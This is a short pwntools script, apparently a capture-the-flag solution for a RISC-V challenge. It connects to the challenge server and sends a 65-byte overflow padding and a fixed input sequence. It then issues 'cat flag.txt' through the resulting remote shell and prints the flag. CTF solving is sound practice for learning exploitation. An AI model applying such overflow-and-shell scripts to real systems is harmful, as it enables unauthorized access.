from pwn import *
context.log_level='warn'
#io = remote ('127.0.0.1', 5000)
io = remote ("spaceheroes-a-riscv-maneuver.chals.io", 443, ssl=True, sni="spaceheroes-a-riscv-maneuver.chals.io")
io.recvuntil(b'>>> ', timeout=1)
io.send(b'Z'*65)
io.sendline(b'HIKDAEKEAFKFAGLBMCJ')
sleep(0.1)
io.sendline(b'cat flag.txt')
print(io.recvall(timeout=1).decode('utf-8'), end='')
